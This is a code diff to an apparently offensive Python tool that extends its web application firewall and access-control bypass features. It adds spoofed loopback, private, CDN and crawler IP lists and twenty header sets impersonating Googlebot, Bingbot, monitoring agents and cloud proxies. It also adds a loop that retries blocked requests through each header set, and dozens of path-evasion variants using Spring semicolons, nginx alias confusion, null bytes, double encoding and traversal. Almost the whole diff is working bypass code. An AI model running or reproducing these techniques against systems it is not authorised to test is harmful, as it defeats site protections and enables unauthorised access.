@@ -98,24 +98,32 @@ _USER_AGENTS = [
 
 # ── Internal IP pool for rotating IP spoofing headers ─────────────────────────
 _BYPASS_IPS = [
-    "127.0.0.1",
-    "127.0.0.2",
-    "10.0.0.1",
-    "10.0.0.100",
-    "10.10.10.1",
-    "10.20.30.1",
-    "172.16.0.1",
-    "172.16.1.100",
-    "172.31.0.1",
-    "192.168.0.1",
-    "192.168.1.1",
-    "192.168.100.1",
-    "::1",
-    "0.0.0.0",
-    "localhost",
-    "0x7f000001",   # 127.0.0.1 hex
-    "2130706433",   # 127.0.0.1 decimal
-    "0177.0.0.01",  # 127.0.0.1 octal
+    # IPv4 loopback variants
+    "127.0.0.1", "127.0.0.2", "127.1", "127.0.1", "0.0.0.0",
+    "0x7f000001",    # 127.0.0.1 hex
+    "2130706433",    # 127.0.0.1 decimal
+    "0177.0.0.01",   # 127.0.0.1 octal
+    "::ffff:127.0.0.1",   # IPv4-mapped IPv6
+    # IPv6 loopback
+    "::1", "[::1]", "::ffff:0:127.0.0.1",
+    # RFC 1918 private ranges
+    "10.0.0.1", "10.0.0.100", "10.10.10.1", "10.20.30.1",
+    "10.96.0.1",     # Kubernetes default cluster IP
+    "10.100.0.1",    # common internal
+    "172.16.0.1", "172.16.1.100", "172.20.0.1",   # Docker bridge
+    "172.31.0.1",    # AWS VPC default
+    "192.168.0.1", "192.168.1.1", "192.168.100.1",
+    # CGNAT / cloud-metadata lookalike
+    "100.64.0.1",    # RFC 6598 shared address
+    "169.254.0.1",   # link-local (AWS metadata range)
+    # Hostnames that resolve to internal
+    "localhost", "localhost.localdomain",
+    # Cloud CDN trusted IPs (some WAFs whitelist these CIDRs)
+    "173.245.48.1",  # Cloudflare
+    "104.16.0.1",    # Cloudflare
+    "199.27.128.1",  # Fastly
+    "157.55.39.1",   # Bingbot — crawlers often bypass WAFs
+    "66.249.66.1",   # Googlebot
 ]
 
 # ── Baseline WAF bypass headers added to EVERY request ────────────────────────
@@ -206,6 +214,104 @@ def make_bypass_headers(ip: str | None = None, extra: dict | None = None) -> dic
     return h
 
 
+# ── Progressive bypass sequences — tried in order when a request is blocked ───
+# Each entry is a dict of headers targeting a specific WAF bypass technique.
+_BYPASS_SEQUENCES: list[dict[str, str]] = [
+    # 1 — All IP-spoofing headers → 127.0.0.1 simultaneously
+    {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1",
+     "CF-Connecting-IP": "127.0.0.1", "True-Client-IP": "127.0.0.1",
+     "X-Originating-IP": "127.0.0.1", "Client-IP": "127.0.0.1",
+     "Forwarded": "for=127.0.0.1;proto=https", "X-Remote-Addr": "127.0.0.1"},
+    # 2 — IPv6 loopback (many WAFs regex-match only dotted-decimal)
+    {"X-Forwarded-For": "::1", "X-Real-IP": "::1",
+     "Forwarded": 'for="[::1]"', "CF-Connecting-IP": "::1",
+     "True-Client-IP": "::1"},
+    # 3 — IPv4-mapped IPv6 (evades simple 127.0.0.1 string match)
+    {"X-Forwarded-For": "::ffff:127.0.0.1", "X-Real-IP": "::ffff:127.0.0.1",
+     "Forwarded": "for=::ffff:127.0.0.1"},
+    # 4 — Decimal / hex / octal encoding of 127.0.0.1
+    {"X-Forwarded-For": "2130706433",   # decimal
+     "X-Real-IP": "0x7f000001",          # hex
+     "X-Client-IP": "0177.0.0.01"},      # octal
+    # 5 — Private 10.x range
+    {"X-Forwarded-For": "10.0.0.1, 10.0.0.2",
+     "X-Client-IP": "10.0.0.1", "X-ProxyUser-Ip": "10.0.0.1",
+     "X-Cluster-Client-IP": "10.0.0.1"},
+    # 6 — Private 172.16.x / 192.168.x / Docker bridge
+    {"X-Forwarded-For": "172.16.0.1", "X-Real-IP": "192.168.1.1",
+     "True-Client-IP": "172.20.0.1", "X-Forwarded-Host": "localhost"},
+    # 7 — Cloudflare trusted CIDR (some origin rules only block non-CF IPs)
+    {"X-Forwarded-For": "173.245.48.1",
+     "CF-Connecting-IP": "173.245.48.1", "True-Client-IP": "173.245.48.1"},
+    # 8 — Fastly / AWS CloudFront trusted range
+    {"X-Forwarded-For": "199.27.128.1",
+     "Fastly-Client-IP": "199.27.128.1"},
+    # 9 — URL-rewrite headers (bypass path-based ACL rules)
+    {"X-Original-URL": "/", "X-Rewrite-URL": "/",
+     "X-Override-URL": "/", "X-HTTP-Method-Override": "GET",
+     "X-Method-Override": "GET"},
+    # 10 — Googlebot UA + crawl IP (many WAFs whitelist Googlebot)
+    {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+     "X-Forwarded-For": "66.249.66.1",
+     "From": "googlebot(at)googlebot.com"},
+    # 11 — Bingbot UA + crawl IP
+    {"User-Agent": "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+     "X-Forwarded-For": "157.55.39.1"},
+    # 12 — Via proxy chain with trusted localhost hop
+    {"Via": "1.1 localhost", "X-Forwarded-For": "127.0.0.1",
+     "X-Forwarded-Proto": "https", "X-Forwarded-Port": "443"},
+    # 13 — Hop-by-hop Connection header tricks (removes X-Forwarded-For from WAF)
+    {"Connection": "close, X-Forwarded-For",
+     "X-Forwarded-For": "127.0.0.1", "Pragma": "no-cache"},
+    # 14 — AJAX/XHR request (some WAFs have looser rules for XHR)
+    {"X-Requested-With": "XMLHttpRequest",
+     "X-Forwarded-For": "127.0.0.1", "Content-Type": "application/json"},
+    # 15 — Azure / AWS internal headers
+    {"X-Azure-FDID": "00000000-0000-0000-0000-000000000000",
+     "X-Forwarded-For": "127.0.0.1", "X-Original-Host": "localhost"},
+    # 16 — Datadog / Pingdom monitoring agent (trusted by many CDNs)
+    {"User-Agent": "Datadog Agent/7.52.0",
+     "X-Forwarded-For": "127.0.0.1", "X-DD-Trace-ID": "0"},
+    # 17 — New Relic browser agent UA
+    {"User-Agent": "New Relic Browser monitoring",
+     "X-Forwarded-For": "127.0.0.1"},
+    # 18 — Content-type bypass (WAF may only inspect JSON/form bodies)
+    {"Content-Type": "text/plain; charset=utf-8",
+     "X-Forwarded-For": "127.0.0.1"},
+    # 19 — Transfer-Encoding identity (forces WAF to pass body un-chunked)
+    {"Transfer-Encoding": "identity", "X-Forwarded-For": "127.0.0.1"},
+    # 20 — CGNAT / shared address space (100.64.0.0/10 — often trusted)
+    {"X-Forwarded-For": "100.64.0.1", "X-Real-IP": "100.64.0.1"},
+]
+
+
+def gen_bypass_attempts(extra_headers: dict | None = None) -> list[dict]:
+    """
+    Return an ordered list of header dicts to try when a request returns 403/401/429.
+
+    Attempt 0 is the full rotating make_bypass_headers() baseline.
+    Attempts 1-N cycle through every _BYPASS_SEQUENCES entry merged with WAF_BYPASS_HEADERS.
+
+    Callers iterate through the list and return on the first non-blocked response:
+
+        last = (None, "", {})
+        for attempt_h in gen_bypass_attempts(extra_headers=headers):
+            ...make request with attempt_h...
+            last = (status, body, hdrs)
+            if status not in (401, 403, 429, 503, 405):
+                return last
+        return last
+    """
+    result: list[dict] = []
+    # Attempt 0: full rotating IP baseline
+    result.append({**make_bypass_headers(), **(extra_headers or {})})
+    # Attempts 1-N: specific bypass technique sequences
+    for seq in _BYPASS_SEQUENCES:
+        merged = {**WAF_BYPASS_HEADERS, **seq, **(extra_headers or {})}
+        result.append(merged)
+    return result
+
+
 def PATH_BYPASS_VARIANTS(path: str) -> list[tuple[str, str]]:
     """
     Generate 30+ normalised path variants for a given path to bypass WAF/ACL rules.
@@ -248,6 +354,37 @@ def PATH_BYPASS_VARIANTS(path: str) -> list[tuple[str, str]]:
         (f"/{base}%5C",                        "backslash-suffix"),
         ("/" + "".join(f"%{ord(c):02x}" if c.isalpha() else c for c in base), "hex-chars"),
         (f"/api/v1/../{base}" if not base.startswith("api") else f"/{base}/../{base}", "traversal-bypass"),
+        # Spring MVC semicolon / matrix variable tricks
+        (f"/;/{base}",                          "spring-semicolon-prefix"),
+        (f"/{base};x=y",                        "spring-matrix-variable"),
+        (f"/.;/{base}",                         "spring-dot-semicolon"),
+        (f"/{base};hack=1/..",                  "spring-matrix-traversal"),
+        # Nginx alias confusion
+        (f"/api/..;/{base}",                    "nginx-alias-confusion"),
+        # Multiple trailing slashes / path normalisation edge cases
+        (f"/{base}///",                         "triple-trailing-slash"),
+        (f"///{base}//",                        "triple-leading-double-trailing"),
+        # Apache Tomcat / Struts / Java servlet extensions
+        (f"/{base}.do",                         "java-do-extension"),
+        (f"/{base}.action",                     "struts-action-extension"),
+        (f"/{base}.htm",                        "htm-extension"),
+        (f"/{base}~",                           "tilde-suffix"),
+        # Cloudflare challenge bypass parameter (confusion)
+        (f"/{base}?__cf_chl_jschl_tk__=bypass", "cf-challenge-param"),
+        # Null byte in query string (NUL truncates path on some back-ends)
+        (f"/{base}?x=1%00&y=2",                "query-null-byte"),
+        # Double-encoded slash prefix / suffix
+        (f"/%252f{base}",                       "double-encoded-slash-prefix"),
+        (f"/{base}%252f",                       "double-encoded-slash-suffix"),
+        # Encoded dot sequences
+        (f"/{base}%2E",                         "encoded-dot-suffix"),
+        (f"/{base}/%2E%2E/",                    "encoded-dotdot"),
+        # Tab suffix (some WAFs don't normalise tabs in paths)
+        (f"/{base}%09%09",                      "double-tab-suffix"),
+        # Windows/IIS backslash (passes as path separator on IIS)
+        (f"/{base.replace('/', chr(92))}",      "backslash-separator"),
+        # Content-negotiation path suffix tricks
+        (f"/{base};.json",                      "semicolon-json"),
     ]
     # Unicode full-width character variants (bypass WAF pattern matching)
     fw = {"a": "ａ", "d": "ｄ", "m": "ｍ", "i": "ｉ", "n": "ｎ",
